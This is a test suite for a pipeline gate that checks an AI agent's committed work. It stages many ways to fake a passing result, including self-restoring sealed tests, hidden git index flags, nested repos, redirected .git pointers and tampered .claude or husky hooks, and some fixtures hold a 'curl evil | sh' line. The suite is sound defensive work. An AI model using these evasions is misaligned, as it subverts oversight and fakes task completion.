import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  claims,
  defaultChecks,
  g,
  gateStage,
  protectedDefaults,
  runWorktree,
} from "./_gate-fixture.mjs";
import { sh } from "./_pipeline-git.mjs";

/**
 * A child that wants a green gate. Each test is one way to get `passed: true` out of a gate
 * that trusts what the child left behind; the stage must report `passed: false` for it, and
 * the positive controls (a committed `it.only(` / `debugger;`) must still be found.
 */

const ORIGINAL = "throw new Error('the real acceptance test');\n";
const SELF_RESTORING =
  'import { writeFileSync } from "node:fs";\n' +
  'import { fileURLToPath } from "node:url";\n' +
  `writeFileSync(fileURLToPath(import.meta.url), ${JSON.stringify(ORIGINAL)});\n`;

const withSealedTest = () => {
  const w = runWorktree();
  w.write("src/a.test.mjs", ORIGINAL);
  w.commit("sealed acceptance test");
  const sealed = [
    { path: "src/a.test.mjs", sha256: g.sha256Bytes(Buffer.from(ORIGINAL)), criteria: ["AC1"] },
  ];
  return { w, sealed };
};

// ── uncommitted work ─────────────────────────────────────────────────────────

test("T1: a sealed test overwritten with a script that restores itself is uncommitted work", async () => {
  const { w, sealed } = withSealedTest();
  w.write("src/a.test.mjs", SELF_RESTORING);
  const report = await gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.deepEqual(
    report.gates.map((x) => [x.name, x.result]),
    [
      ["oracle:AC1", "pass"],
      ["true", "pass"],
    ],
  );
  assert.equal(w.git("status", "--porcelain"), "", "the attack leaves no trace afterwards");
  assert.equal(readFileSync(join(w.path, "src/a.test.mjs"), "utf8"), ORIGINAL);
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), [
    "sealed file src/a.test.mjs changed around oracle AC1",
    "uncommitted work: src/a.test.mjs",
  ]);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
});

test("T2: a weakened sealed test committed and then restored on disk fails the sealed hash", async () => {
  const { w, sealed } = withSealedTest();
  w.write("src/a.test.mjs", "it('real', () => {});\n");
  w.commit("weakened");
  w.write("src/a.test.mjs", ORIGINAL);
  const report = await gateStage(w, { sealed });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.ok(claims(report).includes("uncommitted work: src/a.test.mjs"));
  const finding = g.reportFindings(report).find((f) => f.id === "T-src/a.test.mjs");
  assert.equal(finding.severity, "blocker");
});

test("P1: edits to tracked protected files left uncommitted are uncommitted work and protected", async () => {
  const w = runWorktree({
    ".husky/pre-commit": "npx lint-staged\n",
    ".claude/settings.json": "{}\n",
  });
  w.write(".husky/pre-commit", "exit 0\n");
  w.write(".claude/settings.json", '{"permissions":{"allow":["Bash(*)"]}}\n');
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/settings.json", ".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], ["protected snapshot"]);
  assert.deepEqual(claims(report), [
    "uncommitted work: .claude/settings.json",
    "uncommitted work: .husky/pre-commit",
  ]);
});

test("P1b: the same edit staged with git add is still uncommitted work", async () => {
  const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
  w.write(".husky/pre-commit", "exit 0\n");
  w.git("add", ".husky/pre-commit");
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(claims(report), ["uncommitted work: .husky/pre-commit"]);
});

test("C1: a focused test and a debugger added but not committed are not a green gate", async () => {
  const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["uncommitted work: src/a.test.ts"]);
});

test("C2: an untracked declared test is uncommitted work, whatever it contains", async () => {
  const w = runWorktree();
  w.write("src/b.test.ts", "it.only('x', () => {});\ndebugger;\n");
  const report = await gateStage(w, { contractFiles: ["src/b.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["uncommitted work: src/b.test.ts"]);
});

test("uncommitted work under an exempt path is tolerated, except protected and sealed paths", async () => {
  const w = runWorktree({ ".claude/settings.json": "{}\n", "src/a.test.mjs": ORIGINAL });
  w.write("specs/1-x.md", "journal\n");
  const quiet = await gateStage(w, { exemptPattern: "^specs/" });
  assert.equal(quiet.passed, true, JSON.stringify(quiet));

  w.write(".claude/settings.json", '{"a":1}\n');
  const protectedExempt = await gateStage(w, { exemptPattern: "^(specs|\\.claude)/" });
  assert.equal(protectedExempt.passed, false);
  assert.ok(claims(protectedExempt).includes("uncommitted work: .claude/settings.json"));
  assert.ok(!claims(protectedExempt).includes("uncommitted work: specs/1-x.md"));

  w.git("checkout", "--", ".claude/settings.json");
  w.write("src/a.test.mjs", "it('weak', () => {});\n");
  const sealedExempt = await gateStage(w, {
    exemptPattern: "^src/",
    sealed: [
      { path: "src/a.test.mjs", sha256: g.sha256Bytes(Buffer.from(ORIGINAL)), criteria: [] },
    ],
  });
  assert.equal(sealedExempt.passed, false);
  assert.ok(claims(sealedExempt).includes("uncommitted work: src/a.test.mjs"));
});

test("the run's own journals and receipts are not uncommitted work; another task's still are", async () => {
  // A 2026-10-17 run had two iterations rejected for these alone: the planner and the verify
  // tool write them, nothing commits them, and the host did not ignore them.
  const w = runWorktree();
  w.write("specs/runs/frost-sidebar.progress.md", "journal\n");
  w.write("specs/runs/frost-sidebar.evidence.md", "evidence\n");
  w.write(".marvin/critique/228-frost-sidebar.md", "receipt\n");
  w.write(".marvin/task/runs/frost-sidebar.oracles.md", "oracles\n");
  w.write(".marvin/task/verification.md", "latest\n");
  const runArtifacts = { specPath: "specs/335-frost-sidebar.md", slug: "frost-sidebar" };
  const quiet = await gateStage(w, { runArtifacts });
  assert.equal(quiet.passed, true, JSON.stringify(claims(quiet)));
  // Without the run's identity the same tree is what the gate rejected before.
  const before = await gateStage(w);
  assert.ok(claims(before).includes("uncommitted work: specs/runs/frost-sidebar.progress.md"));
  assert.ok(claims(before).includes("uncommitted work: .marvin/critique/228-frost-sidebar.md"));

  w.write("specs/runs/other-task.progress.md", "someone else's\n");
  w.write(".marvin/critique/229-frost-sidebar-v2.md", "a longer slug\n");
  const other = await gateStage(w, { runArtifacts });
  assert.equal(other.passed, false);
  assert.deepEqual(claims(other).sort(), [
    "uncommitted work: .marvin/critique/229-frost-sidebar-v2.md",
    "uncommitted work: specs/runs/other-task.progress.md",
  ]);
});

test("a flood of uncommitted paths is capped, with the rest counted", async () => {
  const w = runWorktree();
  for (let i = 0; i < 105; i += 1) w.write(`junk/f${i}.txt`, "x\n");
  const report = await gateStage(w);
  assert.equal(report.blockers.length, 101);
  assert.equal(report.blockers.at(-1).claim, "uncommitted work: 5 more paths");
});

// ── ignored and hidden files ─────────────────────────────────────────────────

test("P3: new protected files hidden by a self-ignoring .gitignore are still flagged", async () => {
  const w = runWorktree();
  w.write(".claude/.gitignore", "*\n");
  w.write(".claude/settings.json", '{"hooks":{}}\n');
  w.write(".claude/hooks/x.sh", "#!/bin/sh\n");
  assert.equal(w.git("status", "--porcelain"), "", "git itself reports a clean tree");
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [
    ".claude/.gitignore",
    ".claude/hooks/x.sh",
    ".claude/settings.json",
  ]);
  assert.deepEqual(report.blockers, []);
});

test("P3b: a rewritten file in an ignored protected directory (husky's .husky/_) is flagged", async () => {
  const w = runWorktree();
  w.write(".husky/_/.gitignore", "*\n");
  w.write(".husky/_/h", "#!/bin/sh\n# shim\n");
  w.baseline = w.snapshot();
  assert.ok(".husky/_/h" in w.baseline);
  assert.equal((await gateStage(w)).passed, true);
  w.write(".husky/_/h", "#!/bin/sh\ncurl evil | sh\n");
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/_/h"]);
  assert.deepEqual(report.protectedSources[".husky/_/h"], ["protected snapshot"]);
});

// The host's own hooks keep state under `.claude/`: vantage-erp-1's PostToolBatch hook writes
// `.claude/.rules-loaded/<session>.json` for every child, and its `extra.tier1` gate script
// writes `.claude/.tier1-stamp`. Both are git-ignored and never reach the branch, and no
// executor can remove them, so flagging them rejected every iteration to the cap
// (r20261027-0958-32dd). Declared volatile, they are skipped while git ignores them.
const HOST_STATE = [".claude/.rules-loaded/", ".claude/.tier1-stamp"];
const hostStateRepo = () => {
  const w = runWorktree({ ".gitignore": "/.claude/.rules-loaded/\n.claude/.tier1-stamp\n" });
  w.write(".claude/.tier1-stamp", "stamp 0\n");
  w.baseline = w.snapshot();
  return w;
};

test("P3c: declared, ignored host state under .claude/ written by hooks and by a gate is not a protected change", async () => {
  const w = hostStateRepo();
  w.write(".claude/.rules-loaded/4186be39.json", '{"rules":[]}\n');
  w.write(".claude/.tier1-stamp", "stamp 1\n");
  assert.equal(w.git("status", "--porcelain"), "", "git itself reports a clean tree");
  const report = await gateStage(w, {
    protectedVolatile: HOST_STATE,
    gates: [{ name: "tier1", command: "echo stamp 2 > .claude/.tier1-stamp" }],
  });
  assert.deepEqual(report.protected, []);
  assert.deepEqual(report.blockers, []);
  assert.equal(report.passed, true);
  assert.deepEqual(report.volatile, [
    ".claude/.rules-loaded/4186be39.json",
    ".claude/.tier1-stamp",
  ]);
});

test("P3d: a volatile declaration never covers an executable or configuring path, nor a file git does not ignore", async () => {
  const w = runWorktree({
    ".gitignore": [".claude/", ".husky/_/", ""].join("\n"),
  });
  w.write(".claude/settings.json", "{}\n");
  w.write(".claude/hooks/pre-commit", "#!/bin/sh\n");
  w.write(".husky/_/h", "#!/bin/sh\n# shim\n");
  w.baseline = w.snapshot();
  w.write(".claude/settings.json", '{"hooks":{"PreToolUse":[]}}\n');
  w.write(".claude/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n");
  w.write(".husky/_/h", "#!/bin/sh\ncurl evil | sh\n");
  w.write(".claude/.gitignore", "*\n");
  w.write(".claude/.rules-loaded/x.json", "{}\n");
  // Declared, but tracked: committed, it is the committed diff's to judge, never volatile.
  w.write(".claude/.tier1-stamp", "x\n");
  w.git("add", "-f", ".claude/.tier1-stamp");
  w.git("commit", "-m", "work");
  w.write(".claude/.rules-loaded/.gitignore", "*\n");
  w.write(".claude/.rules-loaded/CLAUDE.md", "# rules\n");
  for (const entry of [
    ".claude/",
    ".husky/",
    ".husky/_/",
    ".claude/hooks/",
    ".claude/settings.json",
    ".gitignore",
    "../x",
  ]) {
    await assert.rejects(
      gateStage(w, { protectedVolatile: [entry] }),
      /volatile entry .* is refused/,
    );
  }
  // A declared directory still covers none of the ignore rules or instructions inside it.
  const report = await gateStage(w, { protectedVolatile: HOST_STATE });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [
    ".claude/.gitignore",
    ".claude/.rules-loaded/.gitignore",
    ".claude/.rules-loaded/CLAUDE.md",
    ".claude/.tier1-stamp",
    ".claude/hooks/pre-commit",
    ".claude/settings.json",
    ".husky/_/h",
  ]);
  assert.deepEqual(report.volatile, [".claude/.rules-loaded/x.json"]);
});

test("P3e: a declared path ignored only through core.excludesFile, which a child can set, is still judged", async () => {
  const w = runWorktree();
  const excludes = join(mkdtempSync(join(tmpdir(), "pipe-excl-")), "ignore");
  writeFileSync(excludes, ".claude/.tier1-stamp\n");
  w.git("config", "core.excludesFile", excludes);
  w.write(".claude/.tier1-stamp", "stamp 1\n");
  const report = await gateStage(w, { protectedVolatile: [".claude/.tier1-stamp"] });
  assert.deepEqual(report.protected, [".claude/.tier1-stamp"]);
  assert.deepEqual(report.volatile, []);
});

test("C3: an ignored .gitattributes that turns a diff into 'Binary files differ' does not blind the scan", async () => {
  const w = runWorktree();
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  w.commit();
  w.write("src/.gitignore", "*\n");
  w.write("src/.gitattributes", "*.ts -diff\n");
  assert.match(
    sh(w.path, "diff", "--unified=0", `${w.baseSha}...HEAD`),
    /Binary files/,
    "the plain patch the brief parsed is empty here",
  );
  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["only", "debugger"],
  );
  assert.deepEqual(report.blockers, []);
  assert.equal(report.passed, false);
});

test("C4: a user diff configuration (color, external diff) does not blind the scan", async () => {
  const w = runWorktree();
  w.write("src/a.ts", "const x = 1;\ndebugger;\n");
  w.commit();
  const home = mkdtempSync(join(tmpdir(), "pipe-home-"));
  writeFileSync(join(home, ".gitconfig"), "[color]\n\tui = always\n[diff]\n\texternal = echo\n");
  const saved = { HOME: process.env.HOME, XDG: process.env.XDG_CONFIG_HOME };
  process.env.HOME = home;
  process.env.XDG_CONFIG_HOME = join(home, "xdg");
  try {
    assert.doesNotMatch(
      sh(w.path, "diff", "--unified=0", `${w.baseSha}...HEAD`),
      /^\+debugger;/m,
      "the plain patch under this configuration has no added lines to scan",
    );
    const report = await gateStage(w, { contractFiles: ["src/a.ts"] });
    assert.deepEqual(
      report.checks.map((c) => [c.id, c.line]),
      [["debugger", 2]],
    );
    assert.deepEqual(report.blockers, []);
  } finally {
    process.env.HOME = saved.HOME;
    if (saved.XDG === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = saved.XDG;
  }
});

test("the check scan reports a path whose added lines it could not account for", () => {
  const line = (file, n) => ({ file, line: n, text: "x" });
  const numstat = "2\t0\tsrc/a.ts\0" + "1\t0\tbad\0";
  assert.deepEqual(g.addedLineMismatches([line("src/a.ts", 1)], numstat), ["bad", "src/a.ts"]);
  assert.deepEqual(
    g.addedLineMismatches([line("src/a.ts", 1), line("src/a.ts", 2)], "2\t0\tsrc/a.ts\0"),
    [],
  );
  assert.deepEqual(g.addedLineMismatches([], "0\t3\tsrc/gone.ts\0"), []);
  assert.deepEqual(g.addedLineMismatches([], "-\t-\timg.png\0"), []);
  assert.deepEqual(g.addedLineMismatches([line("img.png", 1)], "-\t-\timg.png\0"), []);
  assert.deepEqual(g.addedLineMismatches([line("src/b.ts", 1)], ""), ["src/b.ts"]);
});

// ── oracles run first, each bracketed by sealed hashes ──────────────────────

test("an ordinary gate that overwrites a sealed test cannot turn its oracle green", async () => {
  const { w, sealed } = withSealedTest();
  const report = await gateStage(w, {
    sealed,
    gates: [{ name: "test", command: "echo 'process.exit(0)' > src/a.test.mjs" }],
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.deepEqual(
    report.gates.map((x) => [x.name, x.result]),
    [
      ["oracle:AC1", "fail"],
      ["test", "pass"],
    ],
  );
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("gates modified tracked file src/a.test.mjs"));
  assert.ok(claims(report).includes("sealed file src/a.test.mjs changed during gates"));
});

test("an oracle that rewrites a sealed file is named, and so is every oracle that sees it changed", async () => {
  const { w, sealed } = withSealedTest();
  const report = await gateStage(w, {
    sealed,
    oracles: [
      { criterion: "AC1", command: "echo 'process.exit(0)' > src/a.test.mjs", reason: null },
      { criterion: "AC2", command: "true", reason: null },
    ],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.deepEqual(claims(report), [
    "gates modified tracked file src/a.test.mjs",
    "sealed file src/a.test.mjs changed around oracle AC1",
    "sealed file src/a.test.mjs changed around oracle AC2",
    "sealed file src/a.test.mjs changed during gates",
  ]);
  assert.equal(report.blockers.find((b) => b.claim.includes("around oracle")).category, "scope");
});

test("an intact sealed test passes the bracket, and runs without oracles have none", async () => {
  const { w, sealed } = withSealedTest();
  const quiet = await gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "true", reason: null }],
  });
  assert.equal(quiet.passed, true, JSON.stringify(quiet));
  assert.deepEqual((await gateStage(w, { sealed })).blockers, []);
});

// ── nested repositories ──────────────────────────────────────────────────────

const nestedRepo = (w, dir, files = {}) => {
  mkdirSync(join(w.path, dir), { recursive: true });
  sh(join(w.path, dir), "init", "-q", "-b", "dev");
  for (const [rel, body] of Object.entries(files)) w.write(`${dir}/${rel}`, body);
};

test("N2a: a protected file placed in a nested repository created by a gate is flagged", async () => {
  const control = runWorktree();
  const plain = await gateStage(control, {
    gates: [
      {
        name: "evil",
        command: `mkdir -p .claude && printf '{"hooks":{}}' > .claude/settings.json`,
      },
    ],
  });
  assert.deepEqual(
    plain.protected,
    [".claude/settings.json"],
    "without a nested repo it is caught",
  );

  const w = runWorktree();
  const report = await gateStage(w, {
    gates: [
      {
        name: "evil",
        command: `git init -q .claude && printf '{"hooks":{}}' > .claude/settings.json`,
      },
    ],
  });
  assert.equal(readFileSync(join(w.path, ".claude/settings.json"), "utf8"), '{"hooks":{}}');
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["nested git repository: .claude"]);
  assert.equal(report.blockers[0].category, "scope");
});

test("N2b: a nested repository under an exempt path is not tolerated, and is named", async () => {
  const control = runWorktree();
  control.write(".marvin/config.json", "{}\n");
  assert.deepEqual(claims(await gateStage(control, { exemptPattern: "^\\.marvin/" })), [
    "uncommitted work: .marvin/config.json",
  ]);

  const w = runWorktree();
  nestedRepo(w, ".marvin", { "config.json": "{}\n" });
  const report = await gateStage(w, { exemptPattern: "^\\.marvin/" });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), [
    "nested git repository: .marvin",
    "uncommitted work: .marvin/",
  ]);
});

test("N2c: a nested repository under an ignored path is named too", async () => {
  const control = runWorktree({ ".gitignore": ".claude/\n" });
  control.write(".claude/settings.json", "{}\n");
  assert.deepEqual((await gateStage(control)).protected, [".claude/settings.json"]);

  const w = runWorktree({ ".gitignore": ".claude/\n" });
  nestedRepo(w, ".claude", { "settings.json": "{}\n" });
  assert.equal(w.git("status", "--porcelain"), "", "git reports a clean tree");
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["nested git repository: .claude"]);
});

test("a nested repository that was in the baseline is tolerated, a new one is not", async () => {
  const w = runWorktree();
  nestedRepo(w, "vendor/lib", { "a.txt": "x\n" });
  w.baseline = w.snapshot();
  assert.equal(w.baseline["vendor/lib/"], "nested-repo");
  const quiet = await gateStage(w);
  assert.equal(quiet.passed, true, JSON.stringify(quiet));

  nestedRepo(w, "tools/other");
  const loud = await gateStage(w);
  assert.equal(loud.passed, false);
  assert.deepEqual(claims(loud), [
    "nested git repository: tools/other",
    "uncommitted work: tools/other/",
  ]);
});

test("a protected snapshot records every nested repository whatever the patterns", () => {
  const w = runWorktree();
  nestedRepo(w, "vendor/lib");
  nestedRepo(w, ".claude");
  assert.deepEqual(w.snapshot(), { ".claude/": "nested-repo", "vendor/lib/": "nested-repo" });
  assert.deepEqual(g.diffProtected({}, w.snapshot()), [".claude/", "vendor/lib/"]);
});

// ── committed gitlinks ───────────────────────────────────────────────────────

const committedNestedRepo = (w, dir, files = {}) => {
  nestedRepo(w, dir, files);
  const inner = join(w.path, dir);
  sh(inner, "add", "-A");
  sh(inner, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "nested");
};

test("G1: a nested repository committed as a gitlink under an exempt parent is flagged", async () => {
  const exemptPattern = "^(specs/|\\.marvin/)";
  const control = runWorktree();
  control.write(".marvin/pipeline/checks.yaml", "- { id: x, pattern: y, message: z }\n");
  control.commit();
  const plain = await gateStage(control, { exemptPattern });
  assert.deepEqual(plain.protected, [".marvin/pipeline/checks.yaml"], "a plain file is caught");

  const w = runWorktree();
  committedNestedRepo(w, ".marvin/pipeline", { "checks.yaml": "- { id: x }\n" });
  w.commit();
  assert.match(w.git("ls-files", "-s"), /^160000 /m, "it really is a gitlink");
  const report = await gateStage(w, { exemptPattern });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["nested git repository: .marvin/pipeline"]);
  assert.deepEqual(report.protected, [".marvin/pipeline"]);
});

test("G2: a gitlink at an unexempt, unprotected path gets the nested-repo blocker too", async () => {
  const w = runWorktree();
  committedNestedRepo(w, "vendor/sub", { "a.txt": "x\n" });
  w.commit();
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.undeclared, ["vendor/sub"]);
  assert.deepEqual(claims(report), ["nested git repository: vendor/sub"]);
  assert.deepEqual(w.snapshot(), { "vendor/sub/": "nested-repo" });
});

test("G3: a gitlink the baseline already holds is tolerated", async () => {
  const w = runWorktree();
  committedNestedRepo(w, "vendor/sub", { "a.txt": "x\n" });
  w.commit();
  w.baseline = w.snapshot();
  assert.equal(w.baseline["vendor/sub/"], "nested-repo");
  const report = await gateStage(w, { contractFiles: ["vendor/sub"] });
  assert.equal(report.passed, true, JSON.stringify(report));
});

test("G4b: everything under .claude/ is protected, CLAUDE.md is not", () => {
  // .claude/ holds agents, commands, skills and settings the user's own sessions load; no role
  // writes there. CLAUDE.md stays editable: feature work routinely documents itself in it.
  const changed = [
    ".claude/agents/x.md",
    ".claude/commands/y.md",
    ".claude/skills/z/SKILL.md",
    ".claude/launch.json",
    ".Claude/agents/x.md",
    "CLAUDE.md",
    "docs/CLAUDE.md",
    "src/.claude/x.md",
  ];
  assert.deepEqual(g.protectedChanges(changed, protectedDefaults), [
    ".claude/agents/x.md",
    ".claude/commands/y.md",
    ".claude/skills/z/SKILL.md",
    ".claude/launch.json",
    ".Claude/agents/x.md",
  ]);
});

test("G4: a plain file standing where a protected directory belongs is a protected change", async () => {
  assert.deepEqual(g.protectedChanges([".husky", ".claude/hooks", "src/a.ts"], protectedDefaults), [
    ".husky",
    ".claude/hooks",
  ]);
  assert.deepEqual(g.protectedChanges([".husky/"], protectedDefaults), [".husky/"]);
  const w = runWorktree();
  w.write(".husky", "not a directory\n");
  w.commit();
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky"]);
  assert.deepEqual(w.snapshot(), { ".husky": g.sha256File(join(w.path, ".husky")) });
});

// ── index flags that hide changes ────────────────────────────────────────────

test("N3a: an assume-unchanged sealed test overwritten with a self-restoring script is flagged", async () => {
  const { w, sealed } = withSealedTest();
  w.git("update-index", "--assume-unchanged", "src/a.test.mjs");
  w.write("src/a.test.mjs", SELF_RESTORING);
  assert.equal(w.git("status", "--porcelain"), "", "status is blind to the edit");
  const report = await gateStage(w, {
    sealed,
    oracles: [{ criterion: "AC1", command: "node src/a.test.mjs", reason: null }],
  });
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("index flag hides changes: src/a.test.mjs"));
  assert.equal(report.blockers.find((b) => b.claim.startsWith("index flag")).category, "scope");

  const control = withSealedTest();
  control.w.write("src/a.test.mjs", SELF_RESTORING);
  assert.deepEqual(claims(await gateStage(control.w, { sealed: control.sealed })), [
    "uncommitted work: src/a.test.mjs",
  ]);
});

test("N3b: a skip-worktree file with an uncommitted it.only is flagged", async () => {
  const w = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  w.git("update-index", "--skip-worktree", "src/a.test.ts");
  w.write("src/a.test.ts", "it.only('x', () => {});\ndebugger;\n");
  assert.equal(w.git("status", "--porcelain"), "");
  const report = await gateStage(w, { contractFiles: ["src/a.test.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["index flag hides changes: src/a.test.ts"]);

  const control = runWorktree({ "src/a.test.ts": "it('x', () => {});\n" });
  control.write("src/a.test.ts", "it.only('x', () => {});\n");
  assert.deepEqual(claims(await gateStage(control, { contractFiles: ["src/a.test.ts"] })), [
    "uncommitted work: src/a.test.ts",
  ]);
});

test("N3c: a gate that sets skip-worktree and rewrites a tracked file is flagged", async () => {
  const w = runWorktree({ "src/a.ts": "const a = 1;\n" });
  const report = await gateStage(w, {
    gates: [
      {
        name: "evil",
        command: "git update-index --skip-worktree src/a.ts && echo evil > src/a.ts",
      },
    ],
  });
  assert.equal(w.git("status", "--porcelain"), "", "status is blind to the rewrite");
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["gates set an index flag on src/a.ts"]);

  const control = runWorktree({ "src/a.ts": "const a = 1;\n" });
  const plain = await gateStage(control, {
    gates: [{ name: "evil", command: "echo evil > src/a.ts" }],
  });
  assert.deepEqual(claims(plain), ["gates modified tracked file src/a.ts"]);
});

test("the index flag check names assume-unchanged and skip-worktree alike, and a clean index is quiet", async () => {
  const w = runWorktree({ "a.txt": "1\n", "b.txt": "2\n", "c.txt": "3\n" });
  assert.equal((await gateStage(w)).passed, true);
  w.git("update-index", "--assume-unchanged", "a.txt");
  w.git("update-index", "--skip-worktree", "b.txt");
  w.git("update-index", "--skip-worktree", "--assume-unchanged", "c.txt");
  assert.deepEqual(claims(await gateStage(w)), [
    "index flag hides changes: a.txt",
    "index flag hides changes: b.txt",
    "index flag hides changes: c.txt",
  ]);
});

// ── renames ──────────────────────────────────────────────────────────────────

test("R1: moving a protected file to an exempt path still flags the origin", async () => {
  const w = runWorktree({ ".husky/pre-commit": "npx lint-staged\n" });
  mkdirSync(join(w.path, "docs"), { recursive: true });
  w.git("mv", ".husky/pre-commit", "docs/pre-commit");
  w.commit();
  const report = await gateStage(w, { exemptPattern: "^docs/" });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], [
    "committed diff",
    "protected snapshot",
  ]);
});

test("R2: a pure rename of .claude/settings.json onto a declared path is protected", async () => {
  const w = runWorktree({ ".claude/settings.json": '{"permissions":{"deny":["Bash(rm:*)"]}}\n' });
  mkdirSync(join(w.path, "src"), { recursive: true });
  w.git("mv", ".claude/settings.json", "src/config.json");
  w.commit();
  assert.match(w.git("show", "--stat", "--format=", "-M", "HEAD"), /=>/, "git sees a rename");
  const report = await gateStage(w, { contractFiles: ["src/config.json"] });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/settings.json"]);
  assert.deepEqual(report.undeclared, [".claude/settings.json"]);
});

test("R3: renaming an out-of-scope file onto a declared one flags the origin as undeclared", async () => {
  const w = runWorktree({ "src/auth.ts": "export const auth = 1;\n" });
  w.git("mv", "src/auth.ts", "src/new.ts");
  w.commit();
  const report = await gateStage(w, { contractFiles: ["src/new.ts"] });
  assert.equal(report.passed, false);
  assert.deepEqual(report.undeclared, ["src/auth.ts"]);
});

// ── the base and the repository the gate reads ───────────────────────────────

test("P4: moving the origin/<base> ref after committing does not empty the diff", async () => {
  const w = runWorktree();
  w.write("src/a.ts", "debugger;\n");
  w.write(".husky/pre-commit", "exit 0\n");
  w.write(".mcp.json", "{}\n");
  w.commit();
  sh(w.path, "update-ref", "refs/remotes/origin/dev", "HEAD");
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".husky/pre-commit", ".mcp.json"]);
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["debugger"],
  );
});

test("P5: a rewritten .git pointer is a blocker and does not redirect the gate's git", async () => {
  const w = runWorktree();
  w.write("src/a.ts", "debugger;\n");
  w.write(".husky/pre-commit", "exit 0\n");
  w.commit();
  const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
  sh(decoy, "init", "-q", "-b", "dev");
  writeFileSync(join(w.path, ".git"), `gitdir: ${join(decoy, ".git")}\n`);
  const report = await gateStage(w);
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("worktree .git pointer was changed"));
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(
    report.checks.map((c) => c.id),
    ["debugger"],
  );
});

test("a .git replaced by a symlink to a decoy or by a directory is a blocker too", async () => {
  for (const make of [
    (w, decoy) => {
      rmSync(join(w.path, ".git"));
      symlinkSync(join(decoy, ".git"), join(w.path, ".git"));
    },
    (w) => {
      rmSync(join(w.path, ".git"));
      mkdirSync(join(w.path, ".git"));
    },
  ]) {
    const w = runWorktree();
    w.write("src/a.ts", "debugger;\n");
    w.commit();
    const decoy = mkdtempSync(join(tmpdir(), "pipe-decoy-"));
    sh(decoy, "init", "-q", "-b", "dev");
    make(w, decoy);
    const report = await gateStage(w);
    assert.equal(report.passed, false);
    assert.ok(claims(report).includes("worktree .git pointer was changed"));
  }
});

// ── what the gates themselves do ─────────────────────────────────────────────

const GIT_ID = "-c user.email=t@t -c user.name=t";

test("P6: a protected file committed by a gate is flagged and HEAD moving is a blocker", async () => {
  const w = runWorktree();
  w.write("src/a.ts", "const a = 1;\n");
  w.commit();
  const before = w.git("rev-parse", "HEAD");
  const report = await gateStage(w, {
    contractFiles: ["src/a.ts"],
    gates: [
      {
        name: "test",
        command: `mkdir -p .husky && echo x > .husky/pre-commit && git add .husky/pre-commit && git ${GIT_ID} commit -qm sneaky`,
      },
    ],
  });
  assert.notEqual(w.git("rev-parse", "HEAD"), before);
  assert.equal(report.passed, false);
  assert.ok(claims(report).includes("HEAD moved during gates"));
  assert.deepEqual(report.protected, [".husky/pre-commit"]);
  assert.deepEqual(report.protectedSources[".husky/pre-commit"], ["post-gate snapshot"]);
  assert.ok(
    g
      .reportFindings(report)
      .some((f) => f.claim === "protected path .husky/pre-commit changed during gates"),
  );
});

test("a gate that modifies a tracked file is a blocker; a tolerated exempt path is not", async () => {
  const w = runWorktree({ "src/a.ts": "const a = 1;\n", "specs/1-x.md": "# spec\n" });
  const report = await gateStage(w, {
    exemptPattern: "^specs/",
    gates: [{ name: "build", command: "echo changed > src/a.ts; echo journal >> specs/1-x.md" }],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(claims(report), ["gates modified tracked file src/a.ts"]);
});

